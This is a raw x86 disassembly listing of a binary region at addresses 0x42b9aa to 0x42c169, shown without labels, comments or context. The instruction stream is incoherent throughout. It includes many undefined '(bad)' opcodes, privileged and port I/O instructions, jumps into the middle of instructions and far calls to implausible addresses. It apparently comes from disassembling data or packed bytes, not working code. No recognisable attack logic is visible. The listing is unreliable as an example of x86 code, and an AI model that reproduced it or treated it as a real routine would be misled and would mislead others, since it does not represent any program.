  42b9aa:	add    dh,BYTE PTR ds:0x75e0845
  42b9b0:	ret    0x4d
  42b9b3:	lea    ecx,[ebx+0x18728301]
  42b9b9:	add    BYTE PTR [ebp+0x45],al
  42b9bc:	xor    eax,0xc7009ce9
  42b9c1:	add    al,ch
  42b9c3:	inc    ebp
  42b9c4:	test   DWORD PTR [ebx-0x3eba0708],ecx
  42b9ca:	xor    eax,0x781084d
  42b9cf:	push   edi
  42b9d0:	sahf   
  42b9d1:	push   ecx
  42b9d2:	xor    al,BYTE PTR [ecx+0x32f89e89]
  42b9d8:	inc    ebp
  42b9d9:	cmp    edi,DWORD PTR ds:0xc78b9c76
  42b9df:	or     ah,dh
  42b9e1:	inc    ebp
  42b9e2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42b9e8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  42b9ee:	in     al,dx
  42b9ef:	hlt    
  42b9f0:	push   edi
  42b9f1:	push   edi
  42b9f2:	push   ecx
  42b9f3:	push   ecx
  42b9f4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  42b9fa:	sahf   
  42b9fb:	sahf   
  42b9fc:	xor    dh,BYTE PTR [edx]
  42b9fe:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42ba04:	or     BYTE PTR [ebp+0x7],al
  42ba07:	mov    eax,ecx
  42ba09:	clc    
  42ba0a:	jb     0x42b9cd
  42ba0c:	add    BYTE PTR [ebp+0x55],cl
  42ba0f:	or     DWORD PTR [edi],0xc251d157
  42ba15:	add    DWORD PTR [ebx+0x32009e],0x8b76453b
  42ba1f:	mov    edi,eax
  42ba21:	or     cl,al
  42ba23:	inc    ebp
  42ba24:	dec    ebp
  42ba25:	mov    eax,DWORD PTR [ecx+0x514d570c]
  42ba2b:	or     WORD PTR [ecx],0x899e
  42ba30:	xor    cl,BYTE PTR [ebx+0x5776fc3b]
  42ba36:	mov    edx,DWORD PTR [ecx+0x8]
  42ba39:	mov    eax,DWORD PTR [ebp-0x8]
  42ba3c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb262]
  42ba43:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  42ba49:	inc    ebp
  42ba4a:	dec    eax
  42ba4b:	add    ecx,DWORD PTR [ebx+0x574df0f8]
  42ba51:	add    edx,DWORD PTR [ecx-0x8]
  42ba54:	mov    ecx,DWORD PTR [ecx]
  42ba56:	clc    
  42ba57:	or     BYTE PTR [ebp+eax*2+0x4532409e],al
  42ba5e:	mov    ecx,ebp
  42ba60:	clc    
  42ba61:	(bad)  
  42ba62:	popf   
  42ba63:	inc    DWORD PTR [eax]
  42ba65:	ret    0x8b
  42ba68:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  42ba6e:	mov    edi,esp
  42ba70:	hlt    
  42ba71:	test   ecx,esi
  42ba73:	clc    
  42ba74:	or     BYTE PTR [ebp+0x7],al
  42ba77:	xor    al,0xc1
  42ba79:	pushf  
  42ba7a:	jb     0x42baaf
  42ba7c:	add    BYTE PTR [eax-0x3f],al
  42ba7f:	inc    eax
  42ba80:	daa    
  42ba81:	inc    ebp
  42ba82:	inc    ebp
  42ba83:	xor    eax,0x7f80803
  42ba88:	dec    ebp
  42ba89:	sahf   
  42ba8a:	add    esi,DWORD PTR [edx]
  42ba8c:	clc    
  42ba8d:	cmp    DWORD PTR [ecx],ecx
  42ba8f:	or     al,0x8
  42ba91:	add    al,BYTE PTR [ebp+0x2c]
  42ba94:	xor    eax,0x7350845
  42ba99:	or     BYTE PTR [ebp+0x7],cl
  42ba9c:	lea    ebx,[esi-0x748dcdff]
  42baa2:	add    BYTE PTR [eax*2-0x74b21438],cl
  42baa9:	mov    edx,DWORD PTR [eax]
  42baab:	cld    
  42baac:	dec    ebp
  42baad:	push   edi
  42baae:	sub    edx,DWORD PTR [ecx-0x75]
  42bab1:	add    eax,0xf172fc
  42bab6:	or     BYTE PTR [ebp+0x7],cl
  42bab9:	add    eax,ecx
  42babb:	or     al,0x72
  42babd:	add    DWORD PTR [eax],eax
  42babf:	mov    ebx,0x29c2c1
  42bac4:	inc    ebp
  42bac5:	mov    eax,DWORD PTR [ebx]
  42bac7:	cmp    eax,0x3004d1c
  42bacd:	xbegin 0x66c846c7
  42bad3:	clc    
  42bad4:	or     BYTE PTR [ebp+0x45],al
  42bad7:	xor    al,0x35
  42bad9:	pushf  
  42bada:	or     BYTE PTR [ebx+0x454d1007],cl
  42bae0:	lea    eax,[ebp+0x33727501]
  42bae6:	add    cl,ch
  42bae8:	inc    ebp
  42bae9:	add    bl,ch
  42baeb:	add    BYTE PTR [ebx+0x45850845],cl
  42baf1:	je     0x42ba7e
  42baf3:	push   ebx
  42baf4:	or     al,0x85
  42baf6:	dec    ebp
  42baf7:	std    
  42baf8:	mov    bh,bh
  42bafa:	mov    BYTE PTR [ebp-0x75],al
  42bafd:	mov    edi,eax
  42baff:	or     al,0x89
  42bb01:	inc    ebp
  42bb02:	clc    
  42bb03:	mov    esp,esp
  42bb05:	hlt    
  42bb06:	call   DWORD PTR [edi-0x37]
  42bb09:	push   edi
  42bb0a:	or     al,0x51
  42bb0c:	push   ebp
  42bb0d:	xor    ebp,esp
  42bb0f:	mov    esi,0x457251
  42bb14:	xor    eax,0xc7459cc6
  42bb19:	mov    edi,eax
  42bb1b:	or     al,0x85
  42bb1d:	add    al,bh
  42bb1f:	inc    eax
  42bb21:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42bb25:	or     ah,bh
  42bb27:	inc    eax
  42bb28:	push   edi
  42bb29:	jmp    0x42bb7c
  42bb2b:	mov    eax,DWORD PTR ds:0xe8720c
  42bb31:	mov    DWORD PTR [ebp-0x8],eax
  42bb34:	jne    0x42bb7b
  42bb36:	jmp    0x42bac3
  42bb38:	mov    ebp,DWORD PTR [eax]
  42bb3a:	clc    
  42bb3b:	retf   0xff57
  42bb3e:	push   ecx
  42bb3f:	mov    DWORD PTR ds:0x757210,eax
  42bb45:	mov    ecx,DWORD PTR [ebp-0x4]
  42bb48:	sub    esp,DWORD PTR [ebx-0x77]
  42bb4b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  42bb52:	or     ah,bh
  42bb54:	pop    es
  42bb55:	ds sahf 
  42bb57:	push   DWORD PTR [edx]
  42bb59:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  42bb5f:	(bad)  
  42bb60:	mov    bh,bh
  42bb62:	jmp    0x42bb50
  42bb64:	leave  
  42bb65:	jne    0x42bb6f
  42bb67:	call   0x2fb4c1
  42bb6c:	in     al,dx
  42bb6d:	dec    ebp
  42bb6e:	add    dh,BYTE PTR [ebx]
  42bb70:	add    BYTE PTR [ebx],al
  42bb72:	inc    ebp
  42bb73:	cmp    esi,DWORD PTR ds:0xc78b9c74
  42bb79:	or     al,0xf0
  42bb7b:	add    BYTE PTR [ebp+0x458bf845],al
  42bb81:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  42bb87:	adc    al,0x7
  42bb89:	enter  0x9fc0,0xa5
  42bb8d:	rol    BYTE PTR [eax],0x5e
  42bb90:	mov    ecx,ecx
  42bb92:	or     al,0xc
  42bb94:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  42bb9b:	jmp    0x42bb9c
  42bb9d:	push   ebp
  42bb9e:	mov    esp,ebp
  42bba0:	cld    
  42bba1:	inc    ebp
  42bba2:	inc    ebp
  42bba3:	or     DWORD PTR [ecx+0x457dec10],0x0
  42bbaa:	push   esi
  42bbab:	push   esi
  42bbac:	mov    edi,0x7af080f
  42bbb1:	add    bh,al
  42bbb3:	test   DWORD PTR [esi+0x3a7320f],ebx
  42bbb9:	add    BYTE PTR [ecx+0x4540100f],cl
  42bbbf:	mov    ebp,eax
  42bbc1:	mov    ebp,edi
  42bbc3:	lock call edx
  42bbc6:	fcom   DWORD PTR [ebp+0x45]
  42bbc9:	mov    eax,0x148a8b
  42bbce:	push   ecx
  42bbcf:	enter  0xc145,0x83
  42bbd3:	cmp    ecx,DWORD PTR [eax]
  42bbd5:	add    BYTE PTR [ebp+0x4d],al
  42bbd8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  42bbde:	call   0xffa2b74d
  42bbe3:	cmp    eax,DWORD PTR [ebp-0xc]
  42bbe6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  42bbea:	push   ebp
  42bbeb:	(bad)  
  42bbec:	call   0x33b9f0
  42bbf1:	mov    bh,0xdb
  42bbf3:	cld    
  42bbf4:	or     BYTE PTR [ebp+0x45],bl
  42bbf7:	(bad)  
  42bbf8:	call   0xff7cb888
  42bbfd:	add    al,BYTE PTR [ebp+0x37]
  42bc00:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  42bc06:	jne    0x42bc08
  42bc08:	(bad)  
  42bc09:	cmp    edi,esp
  42bc0b:	jne    0x42bc3e
  42bc0d:	mov    edi,edi
  42bc0f:	or     BYTE PTR [ebx-0x307f0b49],cl
  42bc15:	pop    ds
  42bc16:	into   
  42bc17:	je     0x42bbda
  42bc19:	mov    ebx,DWORD PTR [esi]
  42bc1b:	or     BYTE PTR [ebp-0x49],al
  42bc1e:	mov    esp,DWORD PTR [esi-0x77]
  42bc21:	mov    esi,0x8451f0c
  42bc26:	mov    eax,DWORD PTR [eax]
  42bc28:	or     al,0x66
  42bc2a:	sar    bl,0x3b
  42bc2d:	xor    esi,DWORD PTR [ebp+0x66]
  42bc30:	xor    ecx,edi
  42bc32:	pop    edi
  42bc33:	adc    bl,BYTE PTR [ebx+0x7c]
  42bc36:	ret    0xff
  42bc39:	cld    
  42bc3a:	inc    ebp
  42bc3b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  42bc41:	cld    
  42bc42:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  42bc49:	push   0xffffff83
  42bc4b:	pop    edi
  42bc4c:	or     BYTE PTR [ebp+0x53],dh
  42bc4f:	xorps  xmm1,xmm2
  42bc52:	test   BYTE PTR [eax+eax*1],bh
  42bc55:	add    BYTE PTR [eax],al
  42bc57:	adc    eax,eax
  42bc59:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  42bc61:	jmp    DWORD PTR [eax]
  42bc63:	ror    al,0x5e
  42bc66:	inc    ebp
  42bc67:	leave  
  42bc68:	xor    ecx,DWORD PTR [eax]
  42bc6a:	and    DWORD PTR [ebx-0x3ebd0708],ecx
  42bc70:	add    ah,al
  42bc72:	xor    edi,edi
  42bc74:	xor    DWORD PTR [ebx],0x66003308
  42bc7a:	mov    DWORD PTR [ebp-0xc],ecx
  42bc7d:	pcmpgtw mm0,mm0
  42bc80:	add    dl,ah
  42bc82:	leave  
  42bc83:	mov    edi,DWORD PTR [esi-0x7d]
  42bc86:	push   ax
  42bc88:	dec    ebp
  42bc89:	mov    esi,DWORD PTR [ebx-0x75]
  42bc8c:	lea    ebp,[eax-0x7c00ff08]
  42bc92:	xor    eax,DWORD PTR [eax]
  42bc94:	sysret 
  42bc96:	dec    ebp
  42bc97:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  42bc9e:	push   WORD PTR [ecx+0x8]
  42bca2:	jne    0x42bc65
  42bca4:	ud0    ecx,DWORD PTR [ecx]
  42bca7:	mov    edi,DWORD PTR [edx+0x660000ac]
  42bcad:	(bad)  
  42bcae:	iret   
  42bcaf:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  42bcb6:	cli    
  42bcb7:	inc    ebp
  42bcb8:	cmp    al,0x8d
  42bcba:	add    BYTE PTR [esi+0x2d],ah
  42bcbd:	inc    ebp
  42bcbe:	pop    ebp
  42bcbf:	lea    ecx,[edi]
  42bcc1:	mov    dl,bh
  42bcc3:	add    BYTE PTR [edi],cl
  42bcc5:	mov    DWORD PTR [eax+eax*8],edi
  42bcc8:	mov    ebx,0x3b87
  42bccd:	add    BYTE PTR [ebx],ch
  42bccf:	inc    ebp
  42bcd0:	data16 (bad) 
  42bcd2:	clc    
  42bcd3:	int3   
  42bcd4:	cmp    eax,DWORD PTR [eax]
  42bcd6:	je     0x42bc61
  42bcd8:	push   0xffffffc8
  42bcda:	pop    edi
  42bcdb:	xchg   DWORD PTR [ebp+0x0],eax
  42bcde:	data16 add BYTE PTR [ebp+0x45],cl
  42bce2:	lea    cx,[ebp+0x10]
  42bce6:	jb     0x42bce8
  42bce8:	jmp    0x42bc73
  42bcea:	call   eax
  42bcec:	clc    
  42bced:	xchg   DWORD PTR [edi+0x1],edi
  42bcf0:	mov    eax,DWORD PTR [eax]
  42bcf2:	or     BYTE PTR [ebp-0x49],al
  42bcf5:	lea    eax,[eax+0x74003154]
  42bcfb:	push   edi
  42bcfc:	inc    edx
  42bcfd:	jge    0x42bcfe
  42bcff:	mov    DWORD PTR [edi],ecx
  42bd01:	fdiv   DWORD PTR [edi-0x6]
  42bd04:	inc    DWORD PTR [eax]
  42bd06:	xor    edx,DWORD PTR [eax+0x5f]
  42bd09:	xchg   DWORD PTR [ebx+0x1],ebx
  42bd0c:	ret    0x0
  42bd0f:	xor    BYTE PTR [ebp-0x51],cl
  42bd12:	cmp    edi,0xf0ff89f8
  42bd18:	data16 ror al,0x84
  42bd1c:	rol    BYTE PTR [eax],0x3b
  42bd1f:	add    al,dh
  42bd21:	dec    eax
  42bd22:	xchg   esp,eax
  42bd23:	push   ebx
  42bd24:	jmp    0x42bcb1
  42bd26:	push   ebp
  42bd27:	add    esp,ebp
  42bd29:	add    ebp,esp
  42bd2b:	mov    edx,DWORD PTR [edi+0x24]
  42bd2e:	clc    
  42bd2f:	dec    esi
  42bd30:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42bd36:	cmp    BYTE PTR [ebx],al
  42bd38:	jne    0x42bcc3
  42bd3a:	xor    esp,eax
  42bd3c:	jmp    0x45bebf
  42bd41:	add    ebp,DWORD PTR [ecx+ecx*4]
  42bd44:	jne    0x42bd3a
  42bd46:	call   0xffccbaa0
  42bd4b:	clc    
  42bd4c:	xchg   edi,eax
  42bd4d:	sti    
  42bd4e:	add    DWORD PTR [ebx],eax
  42bd50:	add    BYTE PTR [ebp+0x47],bl
  42bd53:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  42bd59:	pop    ebp
  42bd5a:	mov    DWORD PTR [esi-0x48],esi
  42bd5d:	jmp    0x42bda6
  42bd5f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  42bd65:	(bad)  
  42bd67:	cmp    al,0x0
  42bd69:	cmp    eax,DWORD PTR [ebp+0x18]
  42bd6c:	lea    ebx,[ebp-0x56]
  42bd6f:	jle    0x42bd71
  42bd71:	jae    0x42bcfc
  42bd73:	mov    eax,esp
  42bd75:	call   0xb900:0x8b005587
  42bd7c:	inc    ebp
  42bd7d:	push   ebp
  42bd7e:	lea    ecx,[ebp-0x27ff4f12]
  42bd84:	mov    eax,edi
  42bd86:	int3   
  42bd87:	push   ebp
  42bd88:	xchg   edi,eax
  42bd8a:	add    esp,ebp
  42bd8c:	add    BYTE PTR [eax],al
  42bd8e:	inc    ebp
  42bd8f:	add    BYTE PTR [ebp+0x8b3255],cl
  42bd95:	cld    
  42bd96:	mov    DWORD PTR [edx],edi
  42bd98:	aam    0x75
  42bd9a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  42bda0:	mov    DWORD PTR [ebx-0x50],edx
  42bda3:	test   BYTE PTR [ebp-0x1],0xe8
  42bda7:	mov    eax,DWORD PTR [eax]
  42bda9:	hlt    
  42bdaa:	add    al,al
  42bdac:	mov    eax,DWORD PTR ds:0x890045a8
  42bdb2:	dec    DWORD PTR [ebx+0x45fdf0e8]
  42bdb8:	inc    DWORD PTR [eax*2+0xf75854d]
  42bdbf:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  42bdc5:	call   0x72991b06
  42bdca:	je     0x42be2a
  42bdcc:	js     0x42be2d
  42bdce:	lock ret 0x7e
  42bdd2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  42bdd8:	mov    edi,edi
  42bdda:	sbb    al,bl
  42bddc:	clc    
  42bddd:	add    BYTE PTR [ebp-0x73],bh
  42bde0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42bde6:	ror    BYTE PTR [eax],1
  42bde8:	dec    ebp
  42bde9:	xchg   ebp,eax
  42bdea:	mov    edi,edi
  42bdec:	in     al,0x8b
  42bdee:	jge    0x42bd79
  42bdf0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42bdf6:	clc    
  42bdf7:	pop    esi
  42bdf8:	fist   DWORD PTR [ebp+0x5d398b5d]
  42bdfe:	clc    
  42bdff:	add    al,0x6e
  42be01:	mov    eax,DWORD PTR [ebx]
  42be03:	mov    BYTE PTR [ebp+0x0],dl
  42be06:	mov    edx,DWORD PTR [ebx-0x20]
  42be09:	adc    esi,DWORD PTR [edi+0x5e005f42]
  42be0f:	add    eax,0x3b3b73
  42be14:	adc    al,0x89
  42be16:	pop    eax
  42be17:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  42be1b:	ret    0xf08
  42be1e:	cmp    al,0x2
  42be20:	mov    DWORD PTR [edx+0x665500fc],edi
  42be26:	add    eax,ebx
  42be28:	add    esp,eax
  42be2a:	sub    eax,eax
  42be2c:	or     BYTE PTR [ecx-0x77f474bb],cl
  42be32:	add    BYTE PTR [eax],al
  42be34:	mov    DWORD PTR [ebx-0x24],ebx
  42be37:	push   edi
  42be38:	push   ebp
  42be39:	clc    
  42be3a:	add    DWORD PTR [esi+0x1b0100],0x45
  42be41:	out    0xff,eax
  42be43:	add    edx,DWORD PTR [eax]
  42be45:	jmp    0x42be2f
  42be47:	cmp    ch,0x49
  42be4a:	(bad)  
  42be4b:	jmp    0x40c8469d
  42be50:	je     0x42bddc
  42be52:	mov    eax,DWORD PTR [eax-0x10c78304]
  42be58:	inc    ebp
  42be59:	add    BYTE PTR [ebx-0x770375],al
  42be5f:	add    ah,ch
  42be61:	add    edx,esp
  42be63:	pop    edi
  42be64:	pop    ebp
  42be65:	push   ebp
  42be66:	inc    ebx
  42be67:	in     al,dx
  42be68:	pop    ebp
  42be69:	in     al,dx
  42be6a:	cmp    edx,DWORD PTR [edi-0x8]
  42be6d:	xor    eax,0x895b9c94
  42be72:	leave  
  42be73:	call   0x8998057c
  42be78:	in     al,dx
  42be79:	in     al,0x45
  42be7b:	dec    ebp
  42be7c:	push   esi
  42be7d:	test   DWORD PTR [eax+0xfb010f],esi
  42be83:	add    BYTE PTR [eax+0xc018b],dh
  42be89:	leave  
  42be8a:	inc    ebp
  42be8b:	test   al,ch
  42be8d:	add    dh,bh
  42be8f:	add    bh,bh
  42be91:	dec    ebp
  42be92:	push   cs
  42be93:	mov    DWORD PTR [ecx],eax
  42be95:	hlt    
  42be96:	push   es
  42be97:	dec    ebp
  42be98:	leave  
  42be99:	mov    DWORD PTR [eax],ecx
  42be9b:	clc    
  42be9c:	cmovge eax,ecx
  42be9f:	mov    ecx,0x85c2f0
  42bea5:	clc    
  42bea6:	pop    DWORD PTR [ebp+0x1]
  42bea9:	push   ebx
  42beaa:	add    BYTE PTR [ebp-0x15],bh
  42bead:	push   esi
  42beae:	xor    eax,0x898a45
  42beb3:	cld    
  42beb4:	or     BYTE PTR [ebp+0x0],al
  42beb7:	xor    esp,DWORD PTR [esi-0x64]
  42beba:	add    DWORD PTR [esi+0x78308c1],edi
  42bec0:	add    ah,BYTE PTR [edx-0x49]
  42bec3:	int    0xbb
  42bec5:	mov    ecx,DWORD PTR [esi+0xc]
  42bec8:	add    dh,al
  42beca:	cmp    ecx,ebx
  42becc:	jne    0x42be96
  42bece:	xor    ecx,DWORD PTR [ebp+0x66]
  42bed1:	jmp    0xc9bed7
  42bed6:	add    DWORD PTR [ebp+0x0],eax
  42bed9:	mov    eax,ebx
  42bedb:	or     al,0x8b
  42bedd:	(bad)  
  42bede:	mov    ecx,esi
  42bee0:	mov    BYTE PTR [eax+eax*1+0x664c13c],cl
  42bee7:	mov    eax,edi
  42bee9:	or     BYTE PTR [edx],cl
  42beeb:	shl    cl,cl
  42beed:	icebp  
  42beee:	add    BYTE PTR [ebp+0x35],0x8b
  42bef2:	or     BYTE PTR [edx+eax*2],cl
  42bef5:	(bad)  
  42bef6:	or     cl,dh
  42bef8:	stc    
  42bef9:	shl    DWORD PTR [ebp-0x30],0xc6
  42befd:	xor    al,0x0
  42beff:	inc    ebp
  42bf00:	xchg   BYTE PTR [ebx],al
  42bf02:	add    esp,edi
  42bf04:	add    BYTE PTR [ebp-0x39],cl
  42bf07:	mov    al,bl
  42bf09:	test   DWORD PTR [ebx+0x1c348375],ecx
  42bf0f:	sub    al,0xbf
  42bf11:	jmp    0x42be98
  42bf13:	mov    edi,eax
  42bf15:	lock jge 0x42bf09
  42bf18:	lea    esi,[edx-0x74bad501]
  42bf1e:	mov    ebp,esp
  42bf20:	or     cl,dh
  42bf22:	leave  
  42bf23:	add    al,BYTE PTR [eax+eax*4-0x37ff9e00]
  42bf2a:	dec    ebp
  42bf2b:	dec    ebp
  42bf2c:	test   DWORD PTR [ebx],eax
  42bf2e:	paddb  mm6,mm0
  42bf31:	add    DWORD PTR [eax],eax
  42bf33:	dec    ebp
  42bf34:	mov    ecx,DWORD PTR [ebx-0x61b217f0]
  42bf3a:	mov    esi,DWORD PTR [edx]
  42bf3c:	or     al,0x2b
  42bf3e:	dec    ebp
  42bf3f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  42bf45:	mov    esp,esp
  42bf47:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  42bf4e:	mov    DWORD PTR [ebx],ebp
  42bf50:	call   0xc764880
  42bf55:	mov    DWORD PTR [ebp+0x10],ecx
  42bf58:	(bad)  
  42bf59:	push   0x8b85ff10
  42bf5e:	clc    
  42bf5f:	or     al,0x57
  42bf61:	(bad)  
  42bf62:	push   ecx
  42bf63:	retf   
  42bf64:	mov    ebx,0xff4d8dc8
  42bf69:	mov    DWORD PTR [ebp+0x8],eax
  42bf6c:	xor    eax,DWORD PTR [ebp-0x75]
  42bf6f:	cmp    ebp,DWORD PTR [ebx]
  42bf71:	lsl    ebx,WORD PTR [edi-0x8]
  42bf75:	call   DWORD PTR [ebx-0x741bff75]
  42bf7b:	(bad)  
  42bf7c:	or     al,0x5b
  42bf7e:	dec    ebp
  42bf7f:	or     BYTE PTR [ebx],dh
  42bf81:	inc    ebp
  42bf82:	xor    esi,DWORD PTR ds:0x708088d
  42bf88:	in     eax,0x9e
  42bf8a:	add    BYTE PTR [edx],dh
  42bf8c:	inc    ebp
  42bf8d:	pop    edi
  42bf8e:	xor    eax,edx
  42bf90:	test   DWORD PTR [eax],0x83108b8b
  42bf96:	dec    ebp
  42bf97:	adc    al,0x33
  42bf99:	inc    ebp
  42bf9a:	xor    esi,DWORD PTR ds:0xc73b9c2b
  42bfa0:	jne    0x42bf9e
  42bfa2:	mov    eax,DWORD PTR [ebp+0x345f808]
  42bfa8:	mov    eax,DWORD PTR [ebp-0xc]
  42bfab:	mov    DWORD PTR [eax],0x685c9f4
  42bfb1:	clc    
  42bfb2:	dec    ecx
  42bfb3:	push   edi
  42bfb4:	xor    eax,0x4dd51745
  42bfb9:	xlat   BYTE PTR ds:[ebx]
  42bfba:	or     BYTE PTR [ebx+0x4d62fc57],0xd1
  42bfc1:	mov    eax,0x780084d
  42bfc6:	push   edi
  42bfc7:	clc    
  42bfc8:	ret    0xe99e
  42bfcb:	xor    dl,dl
  42bfcd:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  42bfd3:	js     0x8894bd2
  42bfd9:	dec    ebp
  42bfda:	push   ebp
  42bfdb:	mov    edi,DWORD PTR [eax+0xc872fc]
  42bfe1:	lock enter 0xceca,0xf2
  42bfe6:	retf   0x18ce
  42bfe9:	jne    0x42c038
  42bfeb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  42bff1:	enter  0xf0d6,0xca
  42bff5:	retf   0xf2c8
  42bff8:	into   
  42bff9:	out    dx,al
  42bffa:	dec    ebp
  42bffb:	dec    ebp
  42bffc:	jmp    0xff46bf34
  42c001:	xor    eax,DWORD PTR [ebp-0x15]
  42c004:	xor    esi,DWORD PTR [ebx]
  42c006:	mov    esi,DWORD PTR [ebx]
  42c008:	sub    eax,DWORD PTR [ebx]
  42c00a:	add    eax,DWORD PTR [ebx]
  42c00c:	or     bl,dl
  42c00e:	dec    ebp
  42c00f:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  42c015:	xor    eax,DWORD PTR [ebp-0xf00073]
  42c01b:	jb     0x42c062
  42c01d:	add    BYTE PTR [ebx],dh
  42c01f:	dec    ebp
  42c020:	pop    esi
  42c021:	mov    ebp,ebx
  42c023:	cld    
  42c024:	mov    esi,eax
  42c026:	call   0x521117f3
  42c02b:	stc    
  42c02c:	add    eax,0x4572aa
  42c031:	pop    edi
  42c032:	leave  
  42c033:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  42c03a:	in     al,dx
  42c03b:	mov    eax,edi
  42c03d:	xor    eax,0xf8008520
  42c043:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  42c04a:	mov    eax,DWORD PTR [ebp-0x77]
  42c04d:	xor    al,0xf8
  42c04f:	pushf  
  42c050:	inc    ebp
  42c051:	(bad)  
  42c052:	cmp    eax,0x56869ce8
  42c057:	clc    
  42c058:	mov    edi,0x8518e4ec
  42c05e:	jmp    0xf056:0x8b457df8
  42c065:	push   edi
  42c066:	push   edi
  42c067:	push   ecx
  42c068:	push   ecx
  42c069:	push   edi
  42c06a:	xor    eax,esi
  42c06c:	mov    edx,0x32729e
  42c071:	add    ecx,eax
  42c073:	mov    edx,edi
  42c075:	clc    
  42c076:	retf   0xaf45
  42c079:	cmp    eax,0xc78b9ceb
  42c07e:	clc    
  42c07f:	cld    
  42c080:	jne    0x42c09a
  42c082:	xor    ebp,edx
  42c084:	xor    eax,DWORD PTR [ebp+0x3]
  42c087:	or     BYTE PTR [ebx],al
  42c089:	add    BYTE PTR [ebp-0x7747475],al
  42c08f:	hlt    
  42c090:	dec    ebp
  42c091:	dec    ebp
  42c092:	je     0x42c0c7
  42c094:	xor    esi,DWORD PTR [ebx]
  42c096:	xor    eax,DWORD PTR [ebx]
  42c098:	add    eax,DWORD PTR [ebx]
  42c09a:	add    ecx,DWORD PTR [edi]
  42c09c:	rol    ecx,cl
  42c09e:	mov    esi,DWORD PTR [ecx]
  42c0a0:	in     al,dx
  42c0a1:	inc    ebp
  42c0a2:	enter  0xca2b,0x33
  42c0a6:	icebp  
  42c0a7:	mov    DWORD PTR [edx],ecx
  42c0a9:	clc    
  42c0aa:	lock pop ebp
  42c0ac:	enter  0xf2e8,0xfe
  42c0b0:	retf   0xeeff
  42c0b3:	inc    ebp
  42c0b4:	jne    0x42c041
  42c0b6:	mov    edi,eax
  42c0b8:	cld    
  42c0b9:	dec    ebp
  42c0ba:	enter  0xbc89,0x8d
  42c0be:	sahf   
  42c0bf:	sti    
  42c0c0:	xor    bh,bh
  42c0c2:	mov    eax,DWORD PTR [ebp-0xc]
  42c0c5:	mov    esi,DWORD PTR [ebp-0x4]
  42c0c8:	xor    eax,esi
  42c0ca:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9e]
  42c0d1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  42c0d7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  42c0dd:	(bad)  
  42c0de:	push   ebp
  42c0df:	shr    esp,0x4d
  42c0e2:	in     al,dx
  42c0e3:	cmp    eax,DWORD PTR [esi+esi*2]
  42c0e6:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  42c0ec:	pushf  
  42c0ed:	mov    edi,0x85c7f445
  42c0f3:	call   0xf88847f0
  42c0f8:	xor    eax,0x53619cdb
  42c0fd:	dec    ebp
  42c0fe:	inc    ebp
  42c0ff:	mov    esi,DWORD PTR [esi]
  42c101:	clc    
  42c102:	pushf  
  42c103:	into   
  42c104:	mov    ecx,edi
  42c106:	in     al,dx
  42c107:	call   0x8b4b06ca
  42c10c:	pop    es
  42c10d:	or     BYTE PTR [ebx],dh
  42c10f:	or     BYTE PTR [edi+0x8a724d],bh
  42c115:	or     eax,edi
  42c117:	push   ebp
  42c118:	inc    ebp
  42c119:	cmpxchg8b (bad)
  42c11a:	(bad)  
  42c11b:	leave  
  42c11c:	loopne 0x42c0e8
  42c11e:	test   DWORD PTR [ebp-0x8],ecx
  42c121:	mov    eax,DWORD PTR [ebp-0x18]
  42c124:	aad    0x55
  42c126:	xlat   BYTE PTR ds:[ebx]
  42c127:	xor    eax,edi
  42c129:	add    esi,eax
  42c12b:	and    eax,DWORD PTR [eax]
  42c12d:	mov    eax,DWORD PTR [eax]
  42c12f:	(bad)  
  42c130:	leave  
  42c131:	sti    
  42c132:	inc    ebp
  42c133:	dec    DWORD PTR [ebx-0x39cc13ab]
  42c139:	mov    esi,ecx
  42c13b:	clc    
  42c13c:	(bad)  
  42c13d:	dec    ebp
  42c13e:	iret   
  42c13f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  42c145:	jb     0x42c143
  42c147:	add    bh,al
  42c149:	inc    ebp
  42c14a:	(bad)  
  42c14b:	mov    eax,DWORD PTR [ebp-0xc]
  42c14e:	(bad)  
  42c14f:	xabort 0x62
  42c152:	loopne 0x42c121
  42c154:	jmp    FWORD PTR [ebx]
  42c156:	mov    DWORD PTR [ebx],eax
  42c158:	clc    
  42c159:	lock inc ebp
  42c15b:	dec    ebp
  42c15c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  42c162:	loopne 0x42c197
  42c164:	inc    DWORD PTR [ebx]
  42c166:	mov    edi,DWORD PTR [ebx]
  42c168:	hlt    
  42c169:	jne    0x42c1b8
